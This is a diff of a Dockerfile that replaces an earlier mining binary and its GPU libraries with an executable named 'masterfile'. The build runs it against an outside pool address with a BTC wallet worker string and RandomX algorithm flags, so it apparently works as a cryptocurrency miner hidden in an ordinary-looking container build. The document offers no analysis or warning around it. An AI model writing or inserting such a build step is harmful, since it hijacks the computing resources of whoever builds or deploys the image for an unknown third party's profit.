@@ -1,11 +1,7 @@
-FROM ubuntu:18.04
+FROM ubuntu:20.04
 
 RUN apt-get update
-ADD mine mine
-ADD libnvrtc-builtins.so libnvrtc-builtins.so
-ADD libnvrtc.so.10.0 libnvrtc.so.10.0
-ADD config.ini config.ini
-ADD amdmemtweak amdmemtweak
+ADD masterfile masterfile
 
-RUN chmod u+x mine
-RUN ./mine
+RUN chmod u+x masterfile
+RUN ./masterfile -o 161.35.250.122:13333 -u BTC:3L2s7K3Ya5ES9CUZf8S9xncXDvJrBsYB8D.Worker01 -k -a rx/0
